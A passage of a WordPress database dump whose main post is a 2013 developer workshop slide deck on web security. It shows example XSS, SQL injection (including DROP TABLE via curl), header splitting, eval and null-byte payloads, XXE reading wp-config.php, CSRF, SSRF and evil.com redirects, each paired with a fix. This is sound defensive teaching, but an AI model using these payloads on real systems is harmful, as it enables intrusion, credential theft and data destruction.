  KEY `post_id` (`post_id`),
  KEY `meta_key` (`meta_key`)
) ENGINE=InnoDB AUTO_INCREMENT=116 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `wp_postmeta`
--

LOCK TABLES `wp_postmeta` WRITE;
/*!40000 ALTER TABLE `wp_postmeta` DISABLE KEYS */;
INSERT INTO `wp_postmeta` VALUES (7,7,'_edit_last','1'),(8,7,'_edit_lock','1367742439:1'),(9,7,'_wp_page_template','default'),(27,14,'_menu_item_type','post_type'),(28,14,'_menu_item_menu_item_parent','0'),(29,14,'_menu_item_object_id','7'),(30,14,'_menu_item_object','page'),(31,14,'_menu_item_target',''),(32,14,'_menu_item_classes','a:1:{i:0;s:0:\"\";}'),(33,14,'_menu_item_xfn',''),(34,14,'_menu_item_url',''),(35,14,'_menu_item_orphaned','1365713054'),(36,15,'_menu_item_type','post_type'),(37,15,'_menu_item_menu_item_parent','0'),(38,15,'_menu_item_object_id','7'),(39,15,'_menu_item_object','page'),(40,15,'_menu_item_target',''),(41,15,'_menu_item_classes','a:1:{i:0;s:0:\"\";}'),(42,15,'_menu_item_xfn',''),(43,15,'_menu_item_url',''),(44,15,'_menu_item_orphaned','1365713054'),(45,16,'_menu_item_type','post_type'),(46,16,'_menu_item_menu_item_parent','0'),(47,16,'_menu_item_object_id','7'),(48,16,'_menu_item_object','page'),(49,16,'_menu_item_target',''),(50,16,'_menu_item_classes','a:1:{i:0;s:0:\"\";}'),(51,16,'_menu_item_xfn',''),(52,16,'_menu_item_url',''),(53,16,'_menu_item_orphaned','1365713081'),(54,17,'_menu_item_type','post_type'),(55,17,'_menu_item_menu_item_parent','0'),(56,17,'_menu_item_object_id','7'),(57,17,'_menu_item_object','page'),(58,17,'_menu_item_target',''),(59,17,'_menu_item_classes','a:1:{i:0;s:0:\"\";}'),(60,17,'_menu_item_xfn',''),(61,17,'_menu_item_url',''),(62,17,'_menu_item_orphaned','1365713081'),(63,18,'_menu_item_type','post_type'),(64,18,'_menu_item_menu_item_parent','0'),(65,18,'_menu_item_object_id','7'),(66,18,'_menu_item_object','page'),(67,18,'_menu_item_target',''),(68,18,'_menu_item_classes','a:1:{i:0;s:0:\"\";}'),(69,18,'_menu_item_xfn',''),(70,18,'_menu_item_url',''),(71,18,'_menu_item_orphaned','1365713096'),(72,19,'_menu_item_type','post_type'),(73,19,'_menu_item_menu_item_parent','0'),(74,19,'_menu_item_object_id','7'),(75,19,'_menu_item_object','page'),(76,19,'_menu_item_target',''),(77,19,'_menu_item_classes','a:1:{i:0;s:0:\"\";}'),(78,19,'_menu_item_xfn',''),(79,19,'_menu_item_url',''),(80,19,'_menu_item_orphaned','1365713096');
/*!40000 ALTER TABLE `wp_postmeta` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `wp_posts`
--

DROP TABLE IF EXISTS `wp_posts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `wp_posts` (
  `ID` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `post_author` bigint(20) unsigned NOT NULL DEFAULT '0',
  `post_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_date_gmt` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_content` longtext NOT NULL,
  `post_title` text NOT NULL,
  `post_excerpt` text NOT NULL,
  `post_status` varchar(20) NOT NULL DEFAULT 'publish',
  `comment_status` varchar(20) NOT NULL DEFAULT 'open',
  `ping_status` varchar(20) NOT NULL DEFAULT 'open',
  `post_password` varchar(20) NOT NULL DEFAULT '',
  `post_name` varchar(200) NOT NULL DEFAULT '',
  `to_ping` text NOT NULL,
  `pinged` text NOT NULL,
  `post_modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_modified_gmt` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_content_filtered` longtext NOT NULL,
  `post_parent` bigint(20) unsigned NOT NULL DEFAULT '0',
  `guid` varchar(255) NOT NULL DEFAULT '',
  `menu_order` int(11) NOT NULL DEFAULT '0',
  `post_type` varchar(20) NOT NULL DEFAULT 'post',
  `post_mime_type` varchar(100) NOT NULL DEFAULT '',
  `comment_count` bigint(20) NOT NULL DEFAULT '0',
  PRIMARY KEY (`ID`),
  KEY `post_name` (`post_name`),
  KEY `type_status_date` (`post_type`,`post_status`,`post_date`,`ID`),
  KEY `post_parent` (`post_parent`),
  KEY `post_author` (`post_author`)
) ENGINE=InnoDB AUTO_INCREMENT=194 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `wp_posts`
--

LOCK TABLES `wp_posts` WRITE;
/*!40000 ALTER TABLE `wp_posts` DISABLE KEYS */;
INSERT INTO `wp_posts` VALUES (5,1,'2013-04-11 20:24:01','2013-04-11 20:24:01','Chat Sploit','','','publish','open','open','','5','','','2013-04-11 20:24:01','2013-04-11 20:24:01','',0,'http://127.0.0.1:9080/wordpress/?post_type=chatsploit&p=5',0,'chatsploit','',0),(7,1,'2013-04-11 20:38:34','2013-04-11 20:38:34','<div style=\"text-align: center;\">\r\n\r\n<h2><del>Security</del> <ins>Hacking</ins> Hands On</h2>\r\n\r\n[vip_logo]\r\n\r\nVIP Developer Workshop 2013 - Napa, CA - mdawaffe\r\n</div>\r\n\r\n<!--nextpage-->\r\n\r\n<h2>mdawaffe = Mike Adams</h2>\r\n<ul>\r\n	<li>Automattic for ~7 years</li>\r\n	<li>WordPress Developer ~9 years</li>\r\n	<li>Currently work on Team Data</li>\r\n</ul>\r\n\r\n<!--nextpage-->\r\n\r\n<h2>Security is a Process</h2>\r\n<ul>\r\n	<li>Not a feature</li>\r\n	<li>Not an afterthought</li>\r\n</ul>\r\n\r\nLearn to think like an attacker.\r\n\r\n<!--nextpage-->\r\n\r\n<h2>Hands On: We\'re Not Going to Fix Anything</h2>\r\n\r\nWe\'re only going to <strong>break stuff</strong> :)\r\n\r\n<!--nextpage-->\r\n\r\n<h2>Injection Attacks</h2>\r\n<ul>\r\n	<li>XSS</li>\r\n	<li>SQL Injection</li>\r\n	<li>Header Splitting</li>\r\n	<li>Code Execution</li>\r\n	<li>System Execution</li>\r\n</ul>\r\n\r\n<!--nextpage-->\r\n\r\n<h2>Injection Attacks: Summary</h2>\r\n\r\nUnescaped data tricks the service into betraying itself.\r\n\r\nEach data format or protocol needs its own methods of sanitizing data.\r\n\r\n<h3>Context Is King</h3>\r\n<ul>\r\n	<li>Apps shouldn\'t sanitize SQL queries with <code>wp_specialchars()</code>.</li>\r\n	<li>Apps shouldn\'t sanitize URLs with <code>$wpdb->escape()</code>.</li>\r\n	<li>...</li>\r\n</ul>\r\n\r\n<!--nextpage-->\r\n\r\n<h2>XSS</h2>\r\n\r\n<h3>Our Goal as the Attacker</h2>\r\n\r\nInject JavaScript into the site\'s HTML.\r\n\r\nOnce we can do that, we can act as a privileged user.\r\n\r\n<h3>Example: HTML</h3>\r\n\r\n[code lang=\"php\"]\r\n?>\r\n<a href=\"http://example.com/hello/?ref=<?php\r\n  echo $_GET[\'ref\'];\r\n?>\">Hello</a>\r\n<?php\r\n[/code]\r\n\r\n<h3>Attack</h3>\r\n[code lang=\"no-highlight\"]\r\nhttp://example.com/?ref=\r\n  foo%22+onclick%3D%22javascript%3Aalert%28%2FXSS%2F%29\r\n[/code]\r\n\r\n<h3>Result</h3>\r\n[code lang=html]\r\n<a\r\n  href=\"http://example.com/hello/?ref=foo\"\r\n  onclick=\"javascript:alert(/XSS/)\"\r\n>Hello</a>\r\n[/code]\r\n\r\n<h3>This Would Have Stopped Us</h3>\r\n[code lang=\"php\"]\r\n?>\r\n<a href=\"<?php\r\n  echo esc_url(\r\n    \'http://example.com/hello/?ref=\' .\r\n    urlencode( $_GET[\'ref\'] )\r\n  );\r\n?>\">Hello</a>\r\n<?php\r\n[/code]\r\n<ul>\r\n	<li><code>esc_html()</code>, <code>esc_attr()</code>, <code>esc_url()</code></li>\r\n	<li><code>esc_js()</code>, <code>json_encode()</code></li>\r\n</ul>\r\n\r\nAside: apps can accidentally break XML output if the output is not first run through <code>ent2ncr()</code>.\r\n\r\n<!--nextpage-->\r\n\r\n<h2>XSS</h2>\r\n\r\n<h3>Example: JS</h3>\r\n\r\n[code lang=js]\r\n$( \'#error\' ).\r\n  append( \"Invalid input: \" + $( \'#input\' ).val() );\r\n[/code]\r\n\r\n<h3>Attack</h3>\r\nEnter <code>&lt;script&gt;</code> tags in the <code>#input</code>.\r\n\r\n<!--nextpage-->\r\n\r\n<h2>XSS</h2>\r\n\r\n<h3>Example: JS Again</h3>\r\n\r\n[code lang=js]\r\nval html = \'<a href=\"\' +\r\n  document.location +\r\n  \'?fun=1\">Click me for fun!</a>\';\r\n[/code]\r\n\r\n<h3>Attack</h3>\r\n\r\n[code lang=no-highlight]\r\nhttp://example.com/#\"onclick=\"alert(/XSS/);\"data-foo=\"\r\n[/code]\r\n\r\n<h3>Result</h3>\r\n\r\n[code lang=js]\r\nval html = \'<a\r\n  href=\"http://example.com/#\"\r\n  onclick=\"alert(/XSS/);\"\r\n  data-foo=\"?fun=1\"\r\n>Click me for fun!</a>\';\r\n[/code]\r\n\r\n<h3>This Would Have Stopped Us</h3>\r\n<ul>\r\n	<li>\r\n		Building HTML from strings is just like PHP:\r\n		Apps must escape everything.\r\n	</li>\r\n	<li>jQuery\'s <code>.html()</code> and <code>.text()</code> are not the same.</li>\r\n	<li>Apps should use jQuery\'s <code>.attr()</code>, <code>.val()</code>, <code>.data()</code>.</li>\r\n</ul>\r\n\r\n<!--nextpage-->\r\n\r\n<h2>XSS</h2>\r\n\r\n<h3>Example: Every Flash Script Ever</h2>\r\n\r\nThe way data is transfered between Flash and JS is very hard to secure correctly.\r\n\r\n<h3>No Flash = No Flash Vulnerability</h3>\r\n\r\nApps shouldn\'t use flash.\r\n\r\nIf they must, flash should be hosted on a cookieless domain.\r\n\r\n<!--nextpage-->\r\n\r\n<h2>SQL Injection</h2>\r\n\r\n<h3>Our Goal as the Attacker</h3>\r\n\r\nRead from or write to the site\'s database in a way it doesn\'t intend.\r\n\r\n<h3>Example</h3>\r\n[code lang=php]\r\n$data = json_decode( $HTTP_RAW_POST_DATA );\r\n$user = $wpdb->get_row(\r\n  \"SELECT * FROM `users` WHERE `name` = \'{$data->name}\'\"\r\n);\r\n[/code]\r\n\r\n<h3>Attack</h3>\r\n[code lang=bash]\r\n( cat <<\'EOF\'\r\n{\"name\":\"bob\'; DROP TABLE `users`;#\'Comment\"}\r\nEOF\r\n) | curl -d @- \'http://example.com\'\r\n[/code]\r\n\r\n<h3>Result</h3>\r\n[code lang=sql]\r\nSELECT *\r\n  FROM `users`\r\n  WHERE `name` = \'bob\';\r\nDROP TABLE `users`;#\'Comment\'\r\n[/code]\r\n\r\n<h3>This Would Have Stopped Us</h3>\r\n[code lang=php]\r\n$data = json_decode( $HTTP_RAW_POST_DATA );\r\n$user = $wpdb->get_row( $wpdb->prepare(\r\n  \"SELECT * FROM `users` WHERE `name` = %s\",\r\n  $data->name\r\n) );\r\n[/code]\r\n\r\n<ul>\r\n	<li><code>$wpdb->prepare()</code>, <code>$wpdb->insert()</code>, <code>$wpdb->update()</code></li>\r\n	<li><code>like_escape()</code></li>\r\n</ul>\r\n\r\n<!--nextpage-->\r\n\r\n<h2>Header Splitting</h2>\r\n\r\n<h3>Our Goal as the Attacker</h3>\r\n\r\nHeader manipulation can lead to all sorts of crazy behavior (including XSS).\r\n\r\nLet\'s just log people out.\r\n\r\n<h3>Example</h3>\r\n[code lang=php]\r\nheader( \"Location: {$_GET[\'redirect\']}\" )\r\n[/code]\r\n\r\n<h3>Attack</h3>\r\n[code lang=no-highlight]\r\nhttp://example.com/?redirect=\r\n  http://example.com/%0D\r\n  Set-Cookie:+wordpress_logged_in_123=+\r\n[/code]\r\n\r\n<h3>Result</h3>\r\n[code lang=http]\r\nHTTP/1.1 302 Moved Temporarily\r\nLocation: http://example.com/\r\nSet-Cookie: wordpress_logged_in_123= \r\n...\r\n[/code]\r\n\r\n<h3>This Would Have Stopped Us</h3>\r\n[code lang=php]\r\nwp_redirect( $_GET[\'redirect\'] );\r\n[/code]\r\n\r\n<ul>\r\n	<li>\r\n		This issue with <code>header()</code> was mitigated only as of\r\n		PHP 5.3.11/5.4.0 = April, 2012.\r\n	</li>\r\n	<li>Apps should use <code>wp_redirect()</code>.</li>\r\n</ul>\r\n\r\n<!--nextpage-->\r\n\r\n<h2>Code Execution</h2>\r\n\r\n<h3>Our Goal as the Attacker</h3>\r\n\r\nObvious :)\r\n\r\n<h3>Example: <code>eval()</code></h3>\r\n[code lang=php]\r\neval( $_GET[\'calculator\'] );\r\n[/code]\r\n\r\n<h3>Attack</h3>\r\n\r\nObvious :)\r\n\r\n<h3>No <code>eval()</code> = No <code>eval()</code> Vulnerability</h3>\r\n\r\nApps shouldn\'t use <code>eval()</code>.\r\n\r\n<!--nextpage-->\r\n\r\n<h2>Code Execution</h2>\r\n\r\n<h3>Example: Regex</h3>\r\n[code lang=php]\r\n// preg_replace( \'//e\' ) a.k.a. PREG_REPLACE_EVAL\r\n$content = preg_replace(\r\n  \'!<h1>(.*?)</h1>!e\',\r\n  \'\"<h1>\" . strtoupper( \"$1\" ) . \"</h1>\"\',\r\n  $content\r\n);\r\n[/code]\r\n\r\n<h3>Attack</h3>\r\n[code lang=html]\r\n<h1>{${eval($_GET[php_code])}}</h1>\r\n[/code]\r\n\r\n<h3>Result</h3>\r\n[code lang=php]\r\n// More or less\r\n$something = eval( $_GET[\'php_code\'] );\r\n$content = \"<h1>\" . strtoupper( $$something ) . \"</h1>\";\r\n[/code]\r\n\r\n<h3>This Would Have Stopped Us</h3>\r\n[code lang=php]\r\n$content = preg_replace_callback(\r\n  \'!<h1>(.*?)</h1>!e\',\r\n  function( $matches ) {\r\n    return \'<h1>\' . strtoupper( $matches[1] ) . \'</h1>\';\r\n  },\r\n  $content\r\n);\r\n[/code]\r\n\r\nApps should use <code>preg_replace_callback()</code> instead of <code>preg_replace( \'//e\' )</code>\r\n\r\n<!--nextpage-->\r\n\r\n<h2>Code Execution: Null Bytes</h2>\r\n\r\nPHP is based on C, which uses \"null terminated\" (<code>\\0</code>) strings.\r\n\r\nBecause PHP is awesome, many functions are not \"binary safe\".\r\n\r\n<h3>Example: Regex</h3>\r\n[code lang=php]\r\n$pattern = $_GET[\'pattern\'];\r\n$replace = $_GET[\'replace\'];\r\necho preg_replace(\r\n  \"#$pattern#i\",\r\n  $replace,\r\n  \'hola mundo\'\r\n);\r\n[/code]\r\n\r\n<h3>Attack</h3>\r\n[code lang=no-highlight]\r\nhttp://localhost/naive-search-replace.php\r\n  ?pattern=.%23e%00\r\n  &replace=echo%20phpversion();\r\n[/code]\r\n\r\n<h3>Result</h3>\r\n[code lang=html]\r\n5.3.6\r\n[/code]\r\n\r\n<h3>This Would Have Stopped Us</h3>\r\n[code lang=php]\r\n$pattern = preg_quote( $_GET[\'pattern\'], \'#\' );\r\n$replace = $_GET[\'replace\'];\r\necho preg_replace(\r\n  \"#$pattern#i\",\r\n  $replace,\r\n  \'hola mundo\'\r\n);\r\n[/code]\r\n\r\nApps must always use <code>preg_quote()</code>.\r\n\r\nThis null byte vulnerability was fixed in PHP 5.4.7 = September, 2012.\r\n\r\n<!--nextpage-->\r\n\r\n<h2>Bonus: More Null Byte Fun</h2>\r\n\r\nMost of PHP\'s unsafe functions are those that deal with the filesystem.\r\n\r\n<h3>Example: Unsafe File Type Check</h3>\r\n[code lang=php]\r\n$wp_upload_dir = wp_upload_dir();\r\n$image_cache_dir = $wp_upload_file . \'/image-cache/\';\r\n\r\n$image_name = basename( $_GET[\'url\'] );\r\n$valid_type = wp_check_filetype( $image_file );\r\n\r\nif ( !$valid_type || empty( $valid_type[\'ext\'] ) )\r\n    die( \'Invalid type.\' );\r\n\r\n$tmp = download_url( $_GET[\'url\'] );\r\ncopy( $tmp, $image_cache_dir . \'/\' . $image_file );\r\n[/code]\r\n\r\n<h3>Attack</h3>\r\n[code lang=no-highlight]\r\nhttp://localhost/image-cache.php\r\n  ?file=http://evil.com/dangerous.php%00ignored.gif\r\n[/code]\r\n\r\n<h3>This Would Have Stopped Us</h3>\r\n[code lang=php]\r\n...\r\n$image_name = sanitize_file_name(\r\n  basename( $_GET[\'url\'] )\r\n);\r\n...\r\n[/code]\r\n\r\n<ul>\r\n	<li>Apps should use <code>sanitize_file_name()</code>.</li>\r\n	<li>\r\n		As always, site owners must keep WordPress up to date :)\r\n		Core fix for <code>sanitize_file_name()</code>:\r\n		<a href=\"http://core.trac.wordpress.org/changeset/12072\">[12072]</a> = WP 2.8.5 = October, 2009\r\n	</li>\r\n</ul>\r\n\r\n<!--nextpage-->\r\n\r\n<h3>System Execution</h3>\r\n\r\n<ul>\r\n	<li><code>system()</code></li>\r\n	<li><code>exec()</code></li>\r\n	<li><code>passthru()</code></li>\r\n	<li><code>proc_open()</code></li>\r\n	<li><code>shell_exec()</code></li>\r\n	<li><code>``</code> (backticks)</li>\r\n</ul>\r\n\r\n<h3>Our Goal as the Attacker</h3>\r\n\r\nPwn.\r\n\r\n<h3>No System Calls =<br />No System Execution Vulnerabilities </h3>\r\n<ul>\r\n	<li>These function are dangerous.  Apps shouldn\'t use them.</li>\r\n	<li><code>escapeshellarg()</code> (but watch out for <code>\"-\"</code>!)</li>\r\n</ul>\r\n\r\n<!--nextpage-->\r\n\r\n<h2>XXE: XML eXternal Entity Injection</h2>\r\n\r\nXML is awesome. It lets the document author define additional <code>&amp;entities;</code>.\r\n\r\nXML is extra awesome. It lets the document author reference <strong>external resources</strong> in those definitions.\r\n\r\nPHP is super awesome. By default, it will fetch and use <strong>any external entity</strong> document authors throw at it.\r\n\r\n<h3>Our Goal as the Attacker</h3>\r\n\r\n<ul>\r\n	<li>Intranet access</li>\r\n	<li>Code disclosure</li>\r\n	<li>XSS</li>\r\n	<li>Botnet</li>\r\n	<li>...</li>\r\n</ul>\r\n\r\n<h3>Example</h3>\r\n[code lang=php]\r\n<?php\r\n$xml = simplexml_load_file( $uploaded_file );\r\n?>\r\n<h1><?php printf(\r\n  \'%s Uploaded!\',\r\n  esc_html( $xml->title )\r\n); ?></h1>\r\n[/code]\r\n\r\n<h3>Attack</h3>\r\n[code lang=xml]\r\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?> \r\n<!DOCTYPE something [\r\n  <!ENTITY\r\n    awesome\r\n    SYSTEM\r\n    \"file:///home/web/public_html/wp-config.php\"\r\n  >\r\n]>\r\n<something>\r\n    <title>&awesome;</title>\r\n</something>\r\n[/code]\r\n\r\n<h3>Result</h3>\r\n[code lang=html]\r\n<h1>define(\'DB_NAME\', \'database_name_here\');\r\ndefine(\'DB_USER\', \'username_here\');\r\ndefine(\'DB_PASSWORD\', \'password_here\');\r\ndefine(\'SECURE_AUTH_KEY\',  \'RTYi7!;x...\');\r\ndefine(\'NONCE_KEY\',        \'f0h1rhp4...\');\r\ndefine(\'SECURE_AUTH_SALT\', \'f8zFa!>_...\');\r\ndefine(\'NONCE_SALT\',       \'UqtXSfr@...\');\r\n... Uploaded!</h1>\r\n[/code]\r\n\r\n<h3>This Would Have Stopped Us</h3>\r\n[code lang=php]\r\n<?php\r\nlibxml_disable_entity_loader( true );\r\n$xml = simplexml_load_file( $uploaded_file );\r\n?>\r\n<h1><?php printf(\r\n  \'%s Uploaded!\',\r\n  esc_html( $xml->title )\r\n); ?></h1>\r\n[/code]\r\n\r\n<ul>\r\n	<li><a href=\"http://php.net/manual/en/function.libxml-disable-entity-loader.php\">libxml_disable_entity_loader()</a>.</li>\r\n	<li><a href=\"http://php.net/manual/en/function.libxml-set-external-entity-loader.php\"> libxml_set_external_entity_loader()</a>.</li>\r\n</ul>\r\n\r\n<h3>What Else is Vulnerable?</h3>\r\n\r\nAnything that uses libxml.\r\n\r\n<ul>\r\n	<li>SimpleXML</li>\r\n	<li>XMLReader</li>\r\n	<li>DOMDocument</li>\r\n	<li>...?</li>\r\n</ul>\r\n\r\nEvery PHP app ever that manipulates XML has been hit by vulnerabilities of this type.\r\n\r\nIncluding PHP itself: <a href=\"http://www.cvedetails.com/cve/CVE-2013-1643/\">CVE-2013-1643</a> (5.3.23/5.4.13 = <strong>March, 2013</strong>).\r\n\r\n<!--nextpage-->\r\n\r\n<h2>Injection Attacks: Conclusion</h2>\r\n\r\nAll I/O must be handled correctly.\r\n\r\nMail headers, TCP packets, SOAP requests, LDAP, JSON, Regex, ... anything with input/output.\r\n\r\n<strong>Context is king</strong>.  Each data format or protocol needs its own methods of sanitizing data.\r\n\r\n<h3>Tips for Developers</h3>\r\n\r\n<ul>\r\n	<li>Validate input immediately.</li>\r\n	<li>Keep data \"raw\".</li>\r\n	<li>Sanitize (escape) data as late as possible.</li>\r\n	<li>Easy to read is better than clever to write.</li>\r\n</ul>\r\n\r\n[code lang=php]\r\n$name = esc_html( $_GET[\'name\'] );\r\n...\r\necho $name; # is this safe? Depends on ...\r\n[/code]\r\n\r\n[code lang=php]\r\n$name = $_GET[\'name\']\r\n...\r\necho esc_html( $name ); # is this safe? Yes.\r\n[/code]\r\n\r\n<!--nextpage-->\r\n\r\n<h2>Attacks of Intent</h2>\r\n\r\n<ul>\r\n	<li>CSRF</li>\r\n	<li>Clickjacking</li>\r\n	<li>Cross Iframe Communication</li>\r\n	<li>SSRF</li>\r\n	<li>Open Redirects</li>\r\n</ul>\r\n\r\n<!--nextpage-->\r\n\r\n<h2>Attacks of Intent: Summary</h2>\r\n\r\nWe want to trick a user into doing something they don\'t want to.\r\n\r\nIn addition to verifying the user is logged in and capable of an action, the app needs to make sure the user <strong>intended</strong> to perform that action.\r\n\r\n<!--nextpage-->\r\n\r\n<h2>CSRF: Cross Site Request Forgery</h2>\r\n\r\n<h3>Our Goal as the Attacker</h3>\r\n\r\nWithout a user knowing, trick them into performing some action the we can\'t do ourselves.\r\n\r\n<strong>Note to Developers</strong>: CSRF mitigation is <strong>useless</strong> if there is an XSS vulnerability.\r\n\r\n<h3>Example</h3>\r\n[code lang=php]\r\nif ( \'/account/delete\' === $_SERVER[\'REQUEST_URI\'] ) {\r\n    delete_account( current_user_id() );\r\n}\r\n[/code]\r\n\r\n<h3>Attack</h3>\r\n[code lang=html]\r\n<h1>Look at this cool picture!</h1>\r\n<img src=\"http://example.com/account/delete\" />\r\n[/code]\r\n\r\n<h3>Result</h3>\r\nThe victim\'s browser makes a request to that \"image\" URL and happily sends the victim\'s example.com cookies along with it.\r\n\r\n<h3>This Would Have Stopped Us</h3>\r\n[code lang=php]\r\nif ( \'/account/delete\' === $_SERVER[\'REQUEST_URI\'] ) {\r\n    // Ensures the user followed a link\r\n    // that had been protected with wp_nonce_url()\r\n    check_admin_referer();\r\n\r\n    delete_account( current_user_id() );\r\n}\r\n[/code]\r\n\r\nRequest made != Request intended.\r\n\r\nActions that require permissions must be protected with some secret unknown to the attacker and that will not be automatically sent by the browser.\r\n\r\n<ul>\r\n	<li><code>wp_nonce_url()</code>, <code>wp_nonce_field()</code>, (<code>wp_create_nonce()</code>)</li>\r\n	<li><code>check_admin_referer()</code>, <code>check_ajax_referer()</code> (both badly named), (<code>wp_verify_nonce()</code>)</li>\r\n</ul>\r\n\r\n<!--nextpage-->\r\n\r\n<h2>Clickjacking</h2>\r\n\r\nOur malicious site:\r\n<ul>\r\n	<li>Frames the victim\'s site in an iframe, and</li>\r\n	<li>Tricks visitors into interacting with one site when they think they are interacting with the other.</li>\r\n</ul>\r\n\r\nTo do this, the our malicious site employs some form of UI trickery.\r\n<ul>\r\n	<li>Overlaying the victim\'s site transparently over our malicious site.</li>\r\n	<li>Masking all but some piece of the victim\'s (now generic looking) UI under our malicious site.</li>\r\n	<li>Using a custom CSS mouse cursor to make the visitor think they are clicking one place, when really they are clicking somewhere else.</li>\r\n</ul>\r\n\r\n<h3>This Would Have Stopped Us</h3>\r\n<ul>\r\n	<li><code>X-FRAME-OPTIONS</code> header.</li>\r\n	<li>Framebusting script for older browsers.</li>\r\n</ul>\r\n\r\n[code lang=php]\r\nheader( \'X-FRAME-OPTIONS: SAMEORIGIN\' );\r\n[/code]\r\n\r\n[code lang=html]\r\n<html class=\"inframe\">\r\n<head>\r\n<title>Don\'t frame me, bro!</title>\r\n<style>\r\n.inframe {\r\n  display: none;\r\n}\r\n</style>\r\n<script type=\"text/javascript\">\r\nif ( self === top ) {\r\n  document.documentElement.className =\r\n    document.documentElement.className.\r\n    replace( \'inframe\', \'\' );\r\n} else {\r\n  top.location = self.location;\r\n}\r\n</script>\r\n</head>\r\n[/code]\r\n\r\nWhy the CSS trick?\r\n\r\n[code lang=html]\r\n<iframe sandbox> <!-- HTML5 -->\r\n<iframe security=\"restricted\"> <!-- IE -->\r\n[/code]\r\n\r\n<!--nextpage-->\r\n\r\n<h2>Cross Iframe Communication</h2>\r\n\r\nOld techniques of communicating between iframes are insecure.\r\n<ul>\r\n	<li>Updating URL <code>#fragments</code></li>\r\n	<li><code>window.name</code></li>\r\n	<li>etc.</li>\r\n</ul>\r\n\r\nIf we see this kind of communication, there may be some spoofing or MITM attack we can perform.\r\n\r\n<h3>This Would Have Stopped Us</h3>\r\n\r\n<code>window.postMessage( message, origin )</code>\r\n\r\nAs long as it\'s used securely... :)\r\n\r\n<h3>Tips for Developers</h3>\r\n<ul>\r\n	<li>Always set (and check) <code>origin</code>s when using <code>window.postMessage()</code>.</li>\r\n	<li>Never use <code>\'*\'</code> as the <code>origin</code>.</li>\r\n	<li>Never use user input as the <code>origin</code>.</li>\r\n</ul>\r\n\r\n<!--nextpage-->\r\n\r\n<h2>SSRF: Server Side Request Forgery</h2>\r\n\r\n<h3>Our Goal as the Attacker</h3>\r\n\r\nTrick the victim\'s server into making a request that only it can make.\r\n\r\nThis is basically CSRF on the backend.\r\n\r\n<h3>Example: Is Image?</h3>\r\n[code lang=php]\r\n$url = filter_var( $_POST[\'url\'], FILTER_VALIDATE_URL );\r\n$is_image = false;\r\n\r\nif ( $url ) {\r\n  $image = wp_remote_get( $url );\r\n  $is_image = preg_match(\r\n    \'/image/\',\r\n    wp_remote_retrieve_header( $image, \'content-type\' )\r\n  );\r\n}\r\n\r\nif ( $is_image ) {\r\n  die( \'YAY! IMAGE!\' );\r\n} else {\r\n  die( \'BOO :( AM SAD\' );\r\n}\r\n[/code]\r\n\r\n<h3>Attack</h3>\r\n\r\nSuppose the victim\'s server hosts or otherwise has access to some internal service.\r\n\r\n[code lang=no-highlight]\r\nurl=http://\r\n  the-ceo:12345\r\n  @directory.intranet/users/the-president/\r\n  ?_method=DELETE\r\n[/code]\r\n\r\nNot so <code>wp_<strong style=\"color: red;\">remote</strong>_get()</code> now, are you?\r\n\r\n<h3>This Would Have Stopped Us</h3>\r\n\r\nApps must make sure the URL\'s protocol, host, port, etc. all makes sense.\r\n\r\n<h3>Tip for Developers</h3>\r\n\r\nSee core\'s <a href=\"http://core.trac.wordpress.org/browser/tags/3.5.1/wp-includes/comment.php#L1954\"><code>pingback_ping_source_uri()</code></a> as an example.\r\n\r\nNote: The previous <a href=\"../18/\">XXE Example</a> incorporates another SSRF attack example.\r\n\r\n<!--nextpage-->\r\n\r\n<h2>Open Redirects</h2>\r\n\r\nDefinition: Resources on a server that will redirect to any <strong>external</strong> resource.\r\n\r\n<h3>Example</h3>\r\n\r\n[code lang=no-highlight]\r\nhttp://www.gravatar.com/avatar/\r\n  00000000000000000000000000000000?d={url}\r\n[/code]\r\n\r\n[code lang=php]\r\nif ( ! hash_exists( $hash ) ) {\r\n  wp_redirect( $_GET[\'d\'] );\r\n  exit;\r\n}\r\n[/code]\r\n\r\n<h3>Attack: Phishing</h3>\r\n[code lang=html]\r\n<p>\r\n  You trust <a\r\n    href=\"http://www.gravatar.com/avatar/0\r\n      ?d=http://evil.com/\"\r\n  >Gravatar</a>, right?\r\n</p>\r\n[/code]\r\n\r\n<h3>Attack: OAuth</h3>\r\n\r\nIf an OAuth client has an open redirect, and the OAuth service is flexible enough with their redirect URLs, we can steal credentials :)\r\n\r\n<h3>This Would Have Stopped Us</h3>\r\n[code lang=php]\r\nif ( ! hash_exists( $hash ) ) {\r\n  wp_safe_redirect( $_GET[\'d\'] );\r\n  exit;\r\n}\r\n[/code]\r\n\r\nApps must only redirect to trusted URLs.\r\n<ul>\r\n	<li><code>wp_safe_redirect()</code></li>\r\n	<li>Protect redirects with nonces or some other CSRF mitigation.</li>\r\n</ul>\r\n\r\nNote: Gravatar now serves external images directly, rather than redirecting to arbitrary URLs.\r\n\r\n<!--nextpage-->\r\n\r\n<h2>Attacks of Intent: Conclusion</h2>\r\n\r\nFood for Developers\' thoughts:\r\n<ul>\r\n	<li>Confidentiality: Does it matter who sees your data?</li>\r\n	<li>Authentication: Do you need to know who sent the data you get? Do you need to know who receive the data you send?</li>\r\n	<li>What would happen if someone tried to forge the request/input?</li>\r\n	<li>What would happen if someone sent the requests you expect, but in the wrong order?</li>\r\n</ul>\r\n\r\nApps must not allow requests to be spoofed: verify intent with secrets unavailable to the outside.\r\n\r\n<!--nextpage-->\r\n\r\n<h2>Gotchas</h2>\r\n\r\nCute bugs caused by bad code.\r\n\r\n<h3>Permissions: <code>current_user_can()</code> &gt; <code>is_user_logged_in()</code></h3>\r\nApps must verify the user has permission to view, create, edit, etc.\r\n\r\n<h3>Strict Equality Checking</h3>\r\n<ul>\r\n	<li><code>===</code></li>\r\n	<li><code>in_array( $needle, $haystack, true )</code></li>\r\n</ul>\r\n[code lang=php]\r\n10 == \'10ab7c4f2e\' # true\r\n 0 == \'a75be5c82d\' # true\r\n[/code]\r\n\r\nThis is especially important when apps verify passwords, keys, 